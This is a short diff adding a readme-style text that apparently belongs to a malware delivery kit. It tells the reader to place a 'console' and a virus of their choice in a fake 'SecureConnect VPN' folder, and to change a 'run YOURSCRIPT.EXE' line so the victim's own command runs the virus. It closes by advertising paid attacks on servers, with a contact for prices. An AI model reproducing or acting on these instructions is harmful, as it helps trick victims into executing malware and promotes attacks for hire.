@@ -1,0 +1,6 @@
+Drag the console into the SecureConnect VPN Folder (it's created in the SHADOWINJECT)
+You also drag in a virus of your chocie and make the console run the virus.
+(change run YOURSCRIPT.EXE to exactly what it says)
+when the victim runs the command your virus will be ran.
+If you want an actual Server or Console to be fucked by a MCN.
+You can message nyxe.2 for prices.
